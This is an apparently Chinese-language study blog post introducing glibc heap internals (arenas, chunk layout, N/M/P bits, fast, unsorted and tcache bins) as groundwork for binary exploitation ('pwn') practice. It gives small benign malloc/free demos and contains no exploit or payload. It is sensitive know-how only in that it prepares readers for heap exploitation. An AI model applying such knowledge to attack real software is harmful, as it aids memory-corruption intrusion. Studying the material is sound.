<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>

<!--Description-->



    <meta name="description" content="Pwn-heap note 1
Author:堇姬

筆記連結heap note 1:https://hackmd.io/@naup96321/S1knTRjVR
heap note 2:https://hackmd.io/@naup96321/ryDzdYbjA
版本問題解決首先，在老舊版本ubu"/>


<!--Author-->

    <meta name="author" content="Naup堇姬"/>


<!--Open Graph Title-->

    <meta property="og:title" content="Pwn-heap note 1"/>


<!--Open Graph Description-->

    <meta property="og:description" content="Pwn-heap note 1
Author:堇姬

筆記連結heap note 1:https://hackmd.io/@naup96321/S1knTRjVR
heap note 2:https://hackmd.io/@naup96321/ryDzdYbjA
版本問題解決首先，在老舊版本ubu"/>


<!--Open Graph Site Name-->
    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>

<!--Type page-->

    <meta property="og:type" content="article"/>


<!--Page Cover-->


    <meta property="og:image" content="http://example.com/img/bg4.jpg"/>


<meta name="twitter:card" content="summary_large_image"/>




    <meta name="twitter:image" content="http://example.com/img/bg4.jpg"/>


<!-- Title -->

<title>Pwn-heap note 1 | 堇姬 Naup&#39;s Blog</title>

<!-- Bootstrap Core CSS -->
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">

<!-- Custom CSS -->

<link rel="stylesheet" href="/css/main.css">


<!-- Custom Fonts -->
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>

<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
<!--[if lt IE 9]>
<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->

<!-- Gallery -->
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">

<!-- favicon -->

<link rel="icon" href="/img/icon.jpg"/>



    <!-- Google Analytics -->
    


<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
<!-- Head tag -->

<body>

    <!-- Menu -->
    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
    <div class="container pl-0 pr-0">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
        </div>
        <div class="navbar-nav float-right">
            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
                <i class="fas fa-search"></i>
            </button>
        </div>
    </div>
    <!-- /.container -->
</nav>

    <!-- Main Content -->
    <!-- Page Header -->
<!-- Set your background image for this header in your post front-matter: cover -->

<header class="intro-header" style="background-image: url('/img/bg4.jpg')">
    <div class="container">
        <div class="row">
            <div class="col-lg-12 col-md-12 text-center">
                <div class="post-heading text-white">
                    <h1>Pwn-heap note 1</h1>
                    
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">
            <!-- Post Main Content -->
            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
                
                    <span class="meta d-inline-block">
    
    
    <!-- Date -->
    
        <span class="post-meta-split">&nbsp;|&nbsp;</span>
        <i class="far fa-calendar-check fa-fw"></i>
        2024-12-31
    
    <!-- word count and read count -->
    

    

    
</span>  
                
                <h1 id="Pwn-heap-note-1"><a href="#Pwn-heap-note-1" class="headerlink" title="Pwn-heap note 1"></a>Pwn-heap note 1</h1><blockquote>
<p>Author:堇姬</p>
</blockquote>
<h2 id="筆記連結"><a href="#筆記連結" class="headerlink" title="筆記連結"></a>筆記連結</h2><p>heap note 1:<br><a target="_blank" rel="noopener" href="https://hackmd.io/@naup96321/S1knTRjVR">https://hackmd.io/@naup96321/S1knTRjVR</a></p>
<p>heap note 2:<br><a target="_blank" rel="noopener" href="https://hackmd.io/@naup96321/ryDzdYbjA">https://hackmd.io/@naup96321/ryDzdYbjA</a></p>
<h2 id="版本問題解決"><a href="#版本問題解決" class="headerlink" title="版本問題解決"></a>版本問題解決</h2><p>首先，在老舊版本ubuntu18.04、16.04，要把環境架起來很奇怪。</p>
<p>可以用這個docker image來用<br><a target="_blank" rel="noopener" href="https://hub.docker.com/r/roderickchan/debug_pwn_env/tags">https://hub.docker.com/r/roderickchan/debug_pwn_env/tags</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -i -t --name ubuntu1804 2e99549a1323 bash</span><br><span class="line">docker cp &lt;vm path&gt; 2e8beb8e16d5:&lt;docker path&gt;</span><br></pre></td></tr></table></figure>

<p>進去先</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install nano</span><br></pre></td></tr></table></figure>

<p>裡面有pwndbg+pwngdb很多東西可以用</p>
<p>另外這個docker內的glibc 2.27用的Ubuntu版本較新，所以已經有檢察tcache key機制了，所以我們用patchelf+glibc all in one</p>
<h2 id="甚麼是heap"><a href="#甚麼是heap" class="headerlink" title="甚麼是heap?"></a>甚麼是heap?</h2><ul>
<li>用多少給多少，避免浪費</li>
<li>動態分配的記憶體(ex: malloc、new)</li>
<li>呼叫malloc或new之前是不會有heap segment的</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *prt=<span class="built_in">malloc</span>(size)</span><br></pre></td></tr></table></figure>

<p>ptmalloc2<br>tcmalloc<br>jemalloc</p>
<h2 id="有哪些"><a href="#有哪些" class="headerlink" title="有哪些"></a>有哪些</h2><div class="table-responsive">
<table class="table table-bordered table-striped">
<thead>
<tr>
<th>作業系統</th>
<th>實作方法</th>
</tr>
</thead>
<tbody><tr>
<td>glibc</td>
<td>ptmalloc</td>
</tr>
<tr>
<td>windows</td>
<td>winheap</td>
</tr>
<tr>
<td>freebsd</td>
<td>jemalloc</td>
</tr>
<tr>
<td>OSx</td>
<td>zone allocator</td>
</tr>
</tbody></table>
<h2 id="根據大小分配"><a href="#根據大小分配" class="headerlink" title="根據大小分配"></a>根據大小分配</h2><p>要求memory大小小於128k: 會跟heap pool要求適合大小的空間<br><div class="img-item" data-src="https://hackmd.io/_uploads/SyZm1k3VC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SyZm1k3VC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id=""><a href="#" class="headerlink" title="&lt;128分配"></a>&lt;128分配</h2><p>首先先透過<code>sys_brk</code>分配一塊132kb heap segment(rw-)，叫做<code>arena</code>，由主執行緒分配的所以叫做<code>main arena</code></p>
<p>每個thread都有一個Arena,每個Arena中有多個chunk,這些chunk用linked list串接起來,linked list的head稱為bin</p>
<ul>
<li>之後需要申請空間<br>空間會從這132kb中的chunk先分配,不夠再呼叫brk()來增加空間</li>
<li>減少空間<br>呼叫s_brk()來減少空間</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"> <span class="comment">/* Serialize access. */</span></span><br><span class="line"> __libc_lock_define (, mutex);<span class="comment">//定義了一个0x4byte的lock</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Flags (formerly in max_fast). */</span></span><br><span class="line"> <span class="type">int</span> flags;<span class="comment">//0x4</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks. */</span></span><br><span class="line"> <span class="comment">/* Note this is a bool but not all targets support atomics on booleans. */</span></span><br><span class="line"> <span class="type">int</span> have_fastchunks;<span class="comment">//0x4</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Fastbins */</span></span><br><span class="line"> mfastbinptr fastbinsY[NFASTBINS]; <span class="comment">//fastbin链的head,總共10个, 每个0x10字节</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line"> mchunkptr top;<span class="comment">//0x4 到此为止总共0x96字节</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line"> mchunkptr last_remainder;        <span class="comment">//切割后剩下的chunk链接到last_remainder</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line"> mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];   <span class="comment">// 每个bin头有fd和bk两个指针</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Bitmap of bins */</span></span><br><span class="line"> <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];   <span class="comment">//位图,用32bit来分别表示当前bin哪个链上有chunk，通过按位与的方式</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Linked list */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Linked list for free arenas. Access to this field is serialized</span></span><br><span class="line"><span class="comment">    by free_list_lock in arena.c. */</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Number of threads attached to this arena. 0 if the arena is on</span></span><br><span class="line"><span class="comment">    the free list. Access to this field is serialized by</span></span><br><span class="line"><span class="comment">    free_list_lock in arena.c. */</span></span><br><span class="line"> INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Memory allocated from the system in this arena. */</span></span><br><span class="line"> INTERNAL_SIZE_T system_mem;</span><br><span class="line"> INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Chunk"><a href="#Chunk" class="headerlink" title="Chunk"></a>Chunk</h2><p>glibc實作動態memory管理的一個資料結構<br>用malloc拿到的記憶體就是chunk</p>
<ul>
<li>allocate chunk(inuse)</li>
<li>free chunk</li>
<li>top chunk</li>
</ul>
<p>大小固定為0x10的倍數(舉例假如malloc申請一塊0x19大小的，會拿到0x20)<br>chunk&#x3D;chunk header 0x10 + user data</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/rkmwjl24R.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rkmwjl24R.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> INTERNAL_SIZE_T size_t</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line">INTERNAL_SIZE_T prev_size; <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">INTERNAL_SIZE_T size;	   <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">fd</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="allocate-chunk-inuse"><a href="#allocate-chunk-inuse" class="headerlink" title="allocate chunk(inuse)"></a>allocate chunk(inuse)</h2><p>正在使用的chunk</p>
<ul>
<li>prev_size&#x2F;data: 上一塊如果是free chunk則紀錄該chunk的size，否則同時是他的data</li>
<li>P bit: 上一個chunk是否還在使用 -&gt; 1</li>
<li>M bit: chunk是否透過mmap出來的 -&gt; 2</li>
<li>N bit: 該chunk是否屬於main arena -&gt; 4</li>
</ul>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/ryBc2l3V0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ryBc2l3V0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/BJQ43g2NA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJQ43g2NA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h3 id="N-M-P-bit"><a href="#N-M-P-bit" class="headerlink" title="N M P bit"></a>N M P bit</h3><p>這邊注意一下，這裡是使用bit，也就是用gdb看會同時顯示在最後一位<br>舉個例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">thread_func</span><span class="params">(<span class="type">void</span>* arg)</span> &#123;</span><br><span class="line">    <span class="comment">// 分配 0x30 (48 bytes) 大小的記憶體</span></span><br><span class="line">    <span class="type">void</span>* chunk = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="keyword">if</span> (chunk == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Memory allocation failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 顯示記憶體地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Memory allocated at: %p\n&quot;</span>, chunk);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(chunk);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">pthread_t</span> thread;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 創建新線程</span></span><br><span class="line">    <span class="keyword">if</span> (pthread_create(&amp;thread, <span class="literal">NULL</span>, thread_func, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error creating thread.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待線程完成</span></span><br><span class="line">    pthread_join(thread, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在新線程中，我malloc一塊0x40大小chunk，會發現bit變4，是該malloc不在main arena，所以+4<br><div class="img-item" data-src="https://hackmd.io/_uploads/ryM0LY2oR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ryM0LY2oR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h2><ul>
<li>fd: 指向同一個bin中前一個chunk(linkkist)</li>
<li>bk: 指向同一個bin中後一個chunk(linklist)</li>
</ul>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/BJUM0lnNC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJUM0lnNC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br><div class="img-item" data-src="https://hackmd.io/_uploads/HJ7mAx2VR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJ7mAx2VR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h2><p>在heap最頂端，第一次malloc完後，剩下的是top chunk，之後分配空間時會從top chunk切割</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/r1oDQ724A.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r1oDQ724A.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="main-arena"><a href="#main-arena" class="headerlink" title="main arena"></a>main arena</h2><p>管理及實現process中的heap，在main process中的arena稱為main arena(存在於libc段)</p>
<p>他記錄了很多東西</p>
<ul>
<li>bins鏈表</li>
<li>top chunk位址</li>
</ul>
<h3 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h3><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L1655">https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L1655</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="type">int</span> have_fastchunks;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><div class="img-item" data-src="https://hackmd.io/_uploads/H1ZS7hNi0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1ZS7hNi0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>回收free chunk的資料結構<br>glibc有幾種處理freed chunk的方式依chunk大小、性質、何時free掉區分成</p>
<ul>
<li>Fast bin</li>
<li>Unsorted bin</li>
<li>Small bin</li>
<li>Large bin</li>
<li>Tcache(Glibc 2.26後新增)</li>
</ul>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/Hk61kZhV0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Hk61kZhV0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="Fast-bin"><a href="#Fast-bin" class="headerlink" title="Fast bin"></a>Fast bin</h2><ul>
<li>bin中依size分成0x20、0x30 … 0x80(小於global_max_fast)</li>
<li>fd指向前一個、bk則未使用(singly linklist)</li>
<li>Free時不會將下一塊 P bit 重設</li>
</ul>
<h2 id="Unsorted-bin"><a href="#Unsorted-bin" class="headerlink" title="Unsorted bin"></a>Unsorted bin</h2><ul>
<li>若一個被free的chunk沒被放到Tcache或Fastbin時候，會放到這</li>
<li>鄰近上一塊chunk是free跟上一塊合併</li>
<li>鄰近下一塊是Top chunk跟Top chunk合併</li>
<li>鄰近下一塊不是Top chunk，檢查是不是看是不是free，是就合併，並加入Unsorted bin</li>
</ul>
<p>希望給free掉的chunk再有一次機會被malloc</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/HyOjNV5wA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HyOjNV5wA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><h4 id="source-code-1"><a href="#source-code-1" class="headerlink" title="source code"></a>source code</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> *ptr1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">char</span> *ptr2 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">char</span> *ptr3 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(ptr1);</span><br><span class="line">    <span class="built_in">free</span>(ptr2);</span><br><span class="line">    <span class="built_in">free</span>(ptr3);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><p>先malloc六個chunk</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/SyDrWOiv0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SyDrWOiv0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>第一個是tcache_perthread_struct(詳細請見後面Glibc 2.31機制)<br>接下來就分別是我們malloc的了</p>
<p>另外為了防止被合併掉，所以中間用malloc 0x20隔開，這樣他就會確實進入unsorted bin</p>
<p>再來開始看free，三個都free掉後長這樣，可以看出是個循環</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/r1iZO_ow0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r1iZO_ow0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/SJCCP_iDR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJCCP_iDR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12751?time__1311=GqGxu7G=D=itKGN4eeqBKGQKi=BrkOu03EbD#toc-0">https://xz.aliyun.com/t/12751?time__1311=GqGxu7G%3DD%3DitKGN4eeqBKGQKi%3DBrkOu03EbD#toc-0</a></p>
